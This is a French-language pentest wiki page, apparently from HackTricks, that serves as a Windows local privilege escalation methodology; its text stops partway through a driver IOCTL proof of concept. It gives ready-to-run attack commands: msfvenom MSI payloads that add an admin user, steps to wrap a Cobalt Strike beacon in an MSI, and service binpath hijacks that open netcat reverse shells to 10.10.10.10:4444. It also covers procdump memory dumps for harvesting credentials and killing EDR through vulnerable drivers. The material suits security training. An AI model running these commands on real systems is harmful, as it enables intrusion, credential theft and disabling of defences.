# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher des vecteurs de Windows local privilege escalation :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale Windows

### Access Tokens

**Si vous ne savez pas ce que sont les Windows Access Tokens, lisez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d'informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si vous ne savez pas ce que sont les integrity levels sous Windows, vous devriez lire la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Contrôles de sécurité Windows

Il existe différentes choses sous Windows qui peuvent **prevent you from enumerating the system**, empêcher l'exécution d'exécutables ou même **detect your activities**. Vous devez **read** la **page** suivante et **enumerate** tous ces **defenses** **mechanisms** **before starting the privilege escalation enumeration** :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informations système

### Version info enumeration

Vérifiez si la version de Windows présente une vulnérabilité connue (vérifiez aussi les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de version

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, montrant la **énorme surface d'attaque** qu'un environnement Windows présente.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas intègre watson)_

**Localement avec les informations système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits :**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environnement

Y a-t-il des credential/Juicy info enregistrés dans les env variables ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historique de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers de transcription PowerShell

Vous pouvez apprendre comment l'activer sur [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Les détails des exécutions du pipeline PowerShell sont enregistrés, incluant les commandes exécutées, les invocations de commandes et des extraits de scripts. Cependant, les détails d'exécution complets et les résultats de sortie peuvent ne pas être capturés.

Pour activer cela, suivez les instructions dans la section "Transcript files" de la documentation, en optant pour **"Module Logging"** plutôt que **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour afficher les 15 derniers événements des logs PowersShell, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Un enregistrement complet des activités et du contenu de l'exécution du script est capturé, garantissant que chaque bloc de code est documenté au fur et à mesure de son exécution. Ce processus préserve une piste d'audit complète de chaque activité, précieuse pour forensics et pour l'analyse des comportements malveillants. En documentant toute activité au moment de l'exécution, des informations détaillées sur le processus sont fournies.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements liés au Script Block se trouvent dans le Visualiseur d'événements Windows au chemin : **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\ Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lecteurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées via http**S** mais via http.

Commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant la commande suivante dans cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou ce qui suit dans PowerShell :
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si vous recevez une réponse telle que l'une des suivantes :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

Alors, **c'est exploitable.** Si la dernière entrée de registre est égale à `0`, l'entrée WSUS sera alors ignorée.

Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils tels que : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) — ce sont des scripts d'exploitation MiTM weaponisés pour injecter des mises à jour 'fausses' dans le trafic WSUS non-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
En gros, voici la faille exploitée par ce bug :

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Vous pouvez exploiter cette vulnérabilité en utilisant l'outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu'il sera libéré).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

De nombreux agents d'entreprise exposent une surface IPC sur localhost et un canal de mise à jour privilégié. Si l'enrôlement peut être forcé vers un serveur de l'attaquant et que l'updater fait confiance à une CA racine malveillante ou effectue des vérifications de signature faibles, un utilisateur local peut fournir un MSI malveillant que le service SYSTEM installe. Voir une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) ici :

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 entrées de registre sont **activées** (valeur **0x1**), alors des utilisateurs de n'importe quel niveau de privilège peuvent **installer** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter vous pouvez automatiser cette technique en utilisant le module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire courant un binaire MSI Windows permettant d'escalader les privilèges. Ce script écrit un installateur MSI précompilé qui demande l'ajout d'un utilisateur/groupe (vous aurez donc besoin d'un accès GUI) :
```
Write-UserAddMSI
```
Exécutez simplement le binaire créé pour escalader les privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre comment créer un MSI wrapper en utilisant ces outils. Notez que vous pouvez emballer un "**.bat**" si vous **just** voulez **exécuter** **lignes de commande**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Créer un MSI avec Visual Studio

- **Générez** avec Cobalt Strike ou Metasploit un **nouveau Windows EXE TCP payload** dans `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et tapez "installer" dans la zone de recherche. Sélectionnez le projet **Setup Wizard** et cliquez sur **Next**.
- Donnez au projet un nom, comme **AlwaysPrivesc**, utilisez **`C:\privesc`** pour l'emplacement, sélectionnez **place solution and project in the same directory**, et cliquez sur **Create**.
- Continuez à cliquer sur **Next** jusqu'à atteindre l'étape 3 sur 4 (choose files to include). Cliquez sur **Add** et sélectionnez le Beacon payload que vous venez de générer. Puis cliquez sur **Finish**.
- Sélectionnez le projet **AlwaysPrivesc** dans le **Solution Explorer** et, dans les **Properties**, changez **TargetPlatform** de **x86** en **x64**.
- Il existe d'autres propriétés que vous pouvez modifier, comme **Author** et **Manufacturer**, ce qui peut rendre l'application installée plus légitime.
- Cliquez droit sur le projet et sélectionnez **View > Custom Actions**.
- Cliquez droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantira que le beacon payload est exécuté dès que l'installateur est lancé.
- Dans les **Custom Action Properties**, changez **Run64Bit** à **True**.
- Enfin, **build it**.
- Si l'avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` apparaît, assurez-vous d'avoir défini la plateforme sur x64.

### Installation du MSI

Pour exécuter l'**installation** du fichier `.msi` malveillant en **arrière-plan :**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus et détecteurs

### Paramètres d'audit

Ces paramètres déterminent ce qui est **journalisé**, vous devez donc y prêter attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, il est intéressant de savoir où les logs sont envoyés
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** est conçu pour la gestion des mots de passe locaux du compte Administrator, garantissant que chaque mot de passe est **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne peuvent être consultés que par des utilisateurs à qui des permissions suffisantes ont été accordées via les ACLs, leur permettant de voir les mots de passe admin locaux si autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si activé, **les mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**Plus d'infos sur WDigest dans cette page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protection LSA

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour l'Autorité de sécurité locale (LSA) afin de **bloquer** les tentatives de processus non approuvés de **lire sa mémoire** ou d'injecter du code, renforçant ainsi la sécurité du système.\  
[**Plus d'informations sur la protection LSA ici**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les credentials stockés sur un appareil contre des menaces telles que les attaques pass-the-hash.| [**Plus d'informations sur Credential Guard ici.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Les **Domain credentials** sont authentifiées par la **Local Security Authority** (LSA) et utilisées par les composants du système d'exploitation. Lorsque les données de connexion d'un utilisateur sont authentifiées par un package de sécurité enregistré, les **Domain credentials** de l'utilisateur sont généralement établies.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utilisateurs & Groupes

### Énumérer les utilisateurs & Groupes

Vous devriez vérifier si l'un des groupes auxquels vous appartenez possède des permissions intéressantes.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pouvez être en mesure d'escalader vos privilèges**. Apprenez-en davantage sur les groupes privilégiés et comment les exploiter pour escalader les privilèges ici :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulation de tokens

**En savoir plus** sur ce qu'est un **token** sur cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **en apprendre davantage sur les tokens intéressants** et comment les exploiter :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions
```bash
qwinsta
klist sessions
```
### Dossiers personnels
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politique de mots de passe
```bash
net accounts
```
### Obtenir le contenu du presse-papiers
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours

### Permissions des fichiers et dossiers

Avant tout, en listant les processus, **vérifiez la présence de mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez les permissions d'écriture sur le dossier du binaire afin d'exploiter d'éventuels [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Vérifiez toujours la présence de [**electron/cef/chromium debuggers** en cours d'exécution — vous pouvez les exploiter pour escalader les privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Vérifier les permissions des binaries des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérifier les permissions des dossiers contenant les binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Vous pouvez créer un memory dump d'un processus en cours d'exécution en utilisant **procdump** de sysinternals. Des services comme FTP ont les **credentials in clear text in memory**, essayez de dumper la mémoire et lire les credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applications GUI non sécurisées

**Des applications s'exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD, ou de parcourir des répertoires.**

Exemple : "Windows Help and Support" (Windows + F1), rechercher "command prompt", cliquer sur "Click to open Command Prompt"

## Services

Obtenir la liste des services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Autorisations

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```bash
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilège requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si "Authenticated Users" peuvent modifier n'importe quel service :
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous obtenez cette erreur (par exemple avec SSDPSRV) :

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Vous pouvez l'activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Prenez en compte que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement à ce problème consiste à exécuter:**
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin binaire du service**

Dans le scénario où le groupe "Authenticated users" possède **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier le binaire exécutable du service. Pour modifier et exécuter **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrer le service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Les privilèges peuvent être escaladés via différentes permissions :

- **SERVICE_CHANGE_CONFIG** : Permet la reconfiguration du binaire du service.
- **WRITE_DAC** : Permet la reconfiguration des permissions, conduisant à la capacité de modifier les configurations du service.
- **WRITE_OWNER** : Permet l'acquisition de la propriété et la reconfiguration des permissions.
- **GENERIC_WRITE** : Hérite de la capacité à modifier les configurations du service.
- **GENERIC_ALL** : Hérite également de la capacité à modifier les configurations du service.

Pour la détection et l'exploitation de cette vulnérabilité, _exploit/windows/local/service_permissions_ peut être utilisé.

### Permissions faibles des binaires de service

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous avez **les permissions d'écriture sur le dossier** où le binaire est situé ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez obtenir chaque binaire exécuté par un service en utilisant **wmic** (not in system32) et vérifier vos permissions avec **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez également utiliser **sc** et **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissions de modification du registre des services

Vous devriez vérifier si vous pouvez modifier un registre de service.\
Vous pouvez **vérifier** vos **permissions** sur un **registre** de service en faisant :
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Il faut vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possèdent les permissions `FullControl`. Le cas échéant, le binary exécuté par le service peut être modifié.

Pour changer le Path du binary exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Si vous avez cette permission sur un registry cela signifie que **vous pouvez créer des sous-registry à partir de celui-ci**. Dans le cas des Windows services cela est **suffisant pour exécuter du arbitrary code :**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si le chemin vers un exécutable n'est pas entre guillemets, Windows essaiera d'exécuter chaque terminaison avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_ Windows essaiera d'exécuter:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lister tous les chemins de service non entre guillemets, en excluant ceux appartenant aux services Windows intégrés :
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit: `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Actions de récupération

Windows permet aux utilisateurs de spécifier des actions à effectuer si un service échoue. Cette fonctionnalité peut être configurée pour pointer vers un binary. Si ce binary est remplaçable, une privilege escalation pourrait être possible. Plus de détails sont disponibles dans la [documentation officielle](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Applications installées

Vérifiez les **permissions of the binaries** (peut-être pouvez-vous overwrite l'un d'eux et escalate privileges) et celles des **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissions d'écriture

Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier sensible, ou si vous pouvez modifier un binaire qui sera exécuté par un compte Administrateur (schedtasks).

Une façon de trouver des permissions faibles sur les dossiers/fichiers du système est de :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Exécution au démarrage

**Vérifiez si vous pouvez écraser un registry ou un binary qui va être exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Recherchez d'éventuels **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expose une primitive de lecture/écriture arbitraire du kernel (courante dans des handlers IOCTL mal conçus), vous pouvez escalader en volant un SYSTEM token directement depuis la mémoire kernel. Voir la technique pas‑à‑pas ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abuser de l'absence de FILE_DEVICE_SECURE_OPEN sur les device objects (LPE + EDR kill)

Certains drivers tiers signés créent leur device object avec un SDDL strict via IoCreateDeviceSecure mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans ce flag, la DACL sécurisée n'est pas appliquée lorsque le device est ouvert via un chemin contenant un composant supplémentaire, permettant à tout utilisateur non privilégié d'obtenir un handle en utilisant un namespace path comme :

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (extrait d'un cas réel)

Une fois qu'un utilisateur peut ouvrir le device, les IOCTL privilégiés exposés par le driver peuvent être abusés pour du LPE et du tampering. Exemples de capacités observées sur le terrain :
- Retourner des handles avec accès complet vers des processus arbitraires (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lecture/écriture brute du disque sans restriction (offline tampering, boot-time persistence tricks).
- Terminer des processus arbitraires, y compris Protected Process/Light (PP/PPL), permettant le kill d'AV/EDR depuis l'espace utilisateur via le kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

